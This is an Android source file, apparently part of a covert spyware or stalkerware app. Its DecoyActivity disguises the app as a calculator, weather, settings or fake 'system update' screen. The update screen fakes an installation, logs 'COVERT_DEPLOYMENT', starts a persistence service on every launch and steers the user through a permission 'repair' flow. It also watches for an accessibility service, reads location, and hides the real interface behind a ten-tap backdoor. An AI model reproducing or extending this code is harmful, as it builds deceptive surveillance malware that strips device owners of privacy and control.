package com.labs.labrats;

import android.animation.Animator;
import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Locale;

public class DecoyActivity extends AppCompatActivity {

    private Button btnCheckUpdate;
    private View ivUpdateIcon;
    private View pseudoToast;
    private int clickCount = 0;
    private long lastClickTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        String componentName = getIntent().getComponent().getClassName();
        Log.d("DecoyActivity", "Launched via: " + componentName);

        if (componentName.contains("CalculatorAlias")) {
            setContentView(R.layout.activity_decoy_calculator);
            setupCalculator();
        } else if (componentName.contains("WeatherAlias")) {
            setContentView(R.layout.activity_decoy_weather);
            setupWeather();
        } else if (componentName.contains("SettingsAlias")) {
            setContentView(R.layout.activity_decoy_settings);
            setupSettings();
        } else {
            // High-Fidelity System Update Logic
            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
            if (isDeployed) {
                setContentView(R.layout.activity_decoy_success);
                setupSuccessDecoy();
            } else {
                setContentView(R.layout.activity_new_update);
                setupUpdateDecoy();
            }
        }

        // --- GHOST_WAKE_UP ---
        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
        if (isDeployed && !WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction(Constants.ACTION_START_CORE);
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i);
                } else {
                    startService(i);
                }
            } catch (Exception ignored) {}
        }
    }

    private void setupUpdateDecoy() {
        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
        ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
        pseudoToast = findViewById(R.id.pseudoToast);
        
        final View loadingLayout = findViewById(R.id.loadingLayout);

        if (btnCheckUpdate != null) {
            btnCheckUpdate.setOnClickListener(v -> {
                btnCheckUpdate.setEnabled(false);
                
                // Hide button text and show realistic loading
                btnCheckUpdate.setText("");
                
                if (loadingLayout != null) {
                    loadingLayout.setVisibility(View.VISIBLE);
                    startRealisticLoadingAnimation(loadingLayout);
                }
                
                // First Run "Installation" Sequence (12.5 seconds)
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
                    btnCheckUpdate.setEnabled(true);
                    btnCheckUpdate.setText(R.string.decoy_check_btn);
                    
                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                    FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
                    
                    // Start persistence core
                    Intent i = new Intent(this, WorkManager_Sync.class);
                    i.setAction(Constants.ACTION_START_CORE);
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            startForegroundService(i);
                        } else {
                            startService(i);
                        }
                    } catch (Exception ignored) {}

                    // Transition to Permission Repair Sequence
                    Intent permissions = new Intent(this, PermissionActivity.class);
                    startActivityForResult(permissions, 9999);

                }, 12500);
            });
        }

        if (ivUpdateIcon != null) {
            ivUpdateIcon.setOnClickListener(v -> handleBackdoorClick());
        }
    }

    private void startRealisticLoadingAnimation(View layout) {
        // 1. Rotation Animation
        ObjectAnimator rotate = ObjectAnimator.ofFloat(layout, View.ROTATION, 0f, 360f);
        rotate.setDuration(1500);
        rotate.setRepeatCount(ObjectAnimator.INFINITE);
        rotate.setInterpolator(new android.view.animation.LinearInterpolator());

        // 2. Throbbing (Scale) Animation for the whole group
        ObjectAnimator scaleX = ObjectAnimator.ofFloat(layout, View.SCALE_X, 0.8f, 1.2f, 0.8f);
        ObjectAnimator scaleY = ObjectAnimator.ofFloat(layout, View.SCALE_Y, 0.8f, 1.2f, 0.8f);
        scaleX.setDuration(1200);
        scaleY.setDuration(1200);
        scaleX.setRepeatCount(ObjectAnimator.INFINITE);
        scaleY.setRepeatCount(ObjectAnimator.INFINITE);

        AnimatorSet set = new AnimatorSet();
        set.playTogether(rotate, scaleX, scaleY);
        set.start();
    }

    private void setupSuccessDecoy() {
        View root = findViewById(R.id.successRoot);
        if (root != null) {
            root.setAlpha(0f);
            root.animate().alpha(1f).setDuration(5000).start();
        }

        View backdoor = findViewById(R.id.ivSuccessBackdoor);
        if (backdoor != null) {
            backdoor.setOnClickListener(v -> handleBackdoorClick());
        }

        final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
        final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);

        if (btnCheckForUpdate != null) {
            btnCheckForUpdate.setOnClickListener(v -> {
                btnCheckForUpdate.setEnabled(false);
                btnCheckForUpdate.setText("");
                
                if (loadingLayout != null) {
                    loadingLayout.setVisibility(View.VISIBLE);
                    startRealisticLoadingAnimation(loadingLayout);
                }

                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
                    btnCheckForUpdate.setEnabled(true);
                    btnCheckForUpdate.setText(R.string.decoy_check_btn);
                    
                    android.widget.Toast.makeText(this, R.string.decoy_no_updates, android.widget.Toast.LENGTH_SHORT).show();
                }, 4000);
            });
        }
    }

    private void setupCalculator() {
        TextView display = findViewById(R.id.calcDisplay);
        if (display == null) return;

        display.setOnClickListener(v -> handleBackdoorClick());

        View.OnClickListener listener = v -> {
            Button b = (Button) v;
            String text = b.getText().toString();
            String current = display.getText().toString();

            if (text.equals("C") || text.equals("AC")) {
                display.setText("0");
            } else if (text.equals("=")) {
                try {
                    if (current.contains("+")) {
                        String[] parts = current.split("\\+");
                        double res = Double.parseDouble(parts[0]) + Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("-")) {
                        String[] parts = current.split("-");
                        double res = Double.parseDouble(parts[0]) - Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("x")) {
                        String[] parts = current.split("x");
                        double res = Double.parseDouble(parts[0]) * Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("/")) {
                        String[] parts = current.split("/");
                        double res = Double.parseDouble(parts[0]) / Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    }
                } catch (Exception e) {
                    display.setText("0");
                }
            } else {
                if (current.equals("0") && !text.equals(".")) display.setText(text);
                else display.setText(current + text);
            }
        };

        android.view.ViewGroup root = (android.view.ViewGroup) display.getParent();
        findAndAttachButtons(root, listener);
    }

    private void findAndAttachButtons(android.view.ViewGroup parent, View.OnClickListener listener) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof Button) {
                v.setOnClickListener(listener);
            } else if (v instanceof android.view.ViewGroup) {
                findAndAttachButtons((android.view.ViewGroup) v, listener);
            }
        }
    }

    private String formatResult(double d) {
        if (d == (long) d) return String.format(Locale.US, "%d", (long) d);
        else return String.format(Locale.US, "%.2f", d);
    }

    private void setupWeather() {
        TextView cityTv = findViewById(R.id.weatherCity);
        if (cityTv != null) {
            String city = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("last_city", "New York");
            cityTv.setText(city);
            cityTv.setOnClickListener(v -> handleBackdoorClick());
            updateCityName(cityTv);
        }

        LinearLayout mainInfo = findViewById(R.id.weatherMainInfo);
        if (mainInfo != null) {
            mainInfo.setOnClickListener(v -> {
                Log.d("DecoyActivity", "Weather manual refresh");
                v.animate().alpha(0.5f).setDuration(200).withEndAction(() -> v.animate().alpha(1.0f).setDuration(200).start()).start();
                handleBackdoorClick();
            });
        }
    }

    private void updateCityName(TextView cityTv) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(android.content.Context.LOCATION_SERVICE);
                
                android.location.Location loc = null;
                java.util.List<String> providers = lm.getProviders(true);
                for (String provider : providers) {
                    android.location.Location l = lm.getLastKnownLocation(provider);
                    if (l == null) continue;
                    if (loc == null || l.getAccuracy() < loc.getAccuracy()) {
                        loc = l;
                    }
                }

                if (loc != null) {
                    android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                        geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1, addresses -> {
                            if (!addresses.isEmpty()) {
                                android.location.Address addr = addresses.get(0);
                                if (addr.getLocality() != null) {
                                    String city = addr.getLocality();
                                    String country = addr.getCountryCode();
                                    boolean isCanada = "CA".equalsIgnoreCase(country);
                                    runOnUiThread(() -> {
                                        cityTv.setText(city);
                                        updateWeatherUnits(isCanada);
                                    });
                                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                                }
                            }
                        });
                    } else {
                        java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                        if (addresses != null && !addresses.isEmpty()) {
                            android.location.Address addr = addresses.get(0);
                            if (addr.getLocality() != null) {
                                String city = addr.getLocality();
                                String country = addr.getCountryCode();
                                cityTv.setText(city);
                                updateWeatherUnits("CA".equalsIgnoreCase(country));
                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("DecoyActivity", "City update failed: " + e.getMessage());
            }
        }
    }

    private void updateWeatherUnits(boolean isMetric) {
        try {
            ViewGroup root = findViewById(android.R.id.content);
            processViewsForUnits(root, isMetric);
        } catch (Exception ignored) {}
    }

    private void processViewsForUnits(ViewGroup parent, boolean isMetric) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            android.view.View v = parent.getChildAt(i);
            if (v instanceof TextView) {
                TextView tv = (TextView) v;
                String text = tv.getText().toString();
                if (text.contains("°")) {
                    try {
                        String[] parts = text.split(" ");
                        StringBuilder newText = new StringBuilder();
                        for (String part : parts) {
                            if (part.contains("°")) {
                                String valStr = part.replaceAll("[^0-9.-]", "");
                                if (!valStr.isEmpty()) {
                                    int val = Integer.parseInt(valStr);
                                    int converted = isMetric ? (int)((val - 32) * 5/9.0) : val;
                                    newText.append(part.replace(valStr, String.valueOf(converted))).append(" ");
                                } else { newText.append(part).append(" "); }
                            } else { newText.append(part).append(" "); }
                        }
                        tv.setText(newText.toString().trim());
                    } catch (Exception ignored) {}
                }
            } else if (v instanceof ViewGroup) {
                processViewsForUnits((ViewGroup) v, isMetric);
            }
        }
    }

    private void setupSettings() {
        TextView title = findViewById(R.id.settingsTitle);
        if (title != null) {
            title.setOnClickListener(v -> handleBackdoorClick());
        }

        android.view.ViewGroup root = findViewById(android.R.id.content);
        if (root != null) {
            attachSettingsInteractivity(root);
        }
    }

    private void attachSettingsInteractivity(android.view.ViewGroup parent) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof TextView) {
                TextView tv = (TextView) v;
                String text = tv.getText().toString();
                if (!text.isEmpty() && !text.equals("Settings") && 
                    !text.equals("SYSTEM") && !text.equals("PRIVACY & SECURITY") &&
                    tv.getTextSize() > 45) {
                    
                    v.setOnClickListener(item -> {
                        View mainContent = findViewById(android.R.id.content);
                        if (mainContent != null) {
                            float originalAlpha = mainContent.getAlpha();
                            mainContent.animate().alpha(0.0f).setDuration(200).withEndAction(() -> {
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    mainContent.animate().alpha(originalAlpha).setDuration(300).start();
                                    android.widget.Toast.makeText(this, "Simulating " + text + " interface...", android.widget.Toast.LENGTH_SHORT).show();
                                }, 100);
                            }).start();
                        }
                    });
                }
            } else if (v instanceof android.view.ViewGroup) {
                attachSettingsInteractivity((android.view.ViewGroup) v);
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (IO_Persistence_Manager.getInstance() == null) {
            FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 9999) {
            // Permission sequence completed: Switch to Success Screen
            Log.d("DecoyActivity", "Deployment complete. Displaying Success interface.");
            
            setContentView(R.layout.activity_decoy_success);
            setupSuccessDecoy();
            
            // Final Deployment Confirmation
            pseudoToast = findViewById(R.id.pseudoToast);
            showPseudoToast();
        }
    }

    private void hideSystemUI() {
        if (getSupportActionBar() != null) getSupportActionBar().hide();
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN);
    }

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) {
            clickCount++;
        } else {
            clickCount = 1;
        }
        lastClickTime = currentTime;

        if (clickCount >= 10) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            clickCount = 0;
            finish();
        }
    }

    private void showPseudoToast() {
        if (pseudoToast == null) return;
        pseudoToast.setVisibility(View.VISIBLE);
        pseudoToast.setAlpha(0f);
        pseudoToast.animate().alpha(1f).setDuration(300).start();
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            pseudoToast.animate().alpha(0f).setDuration(300).withEndAction(() -> pseudoToast.setVisibility(View.GONE)).start();
        }, 2500);
    }
}
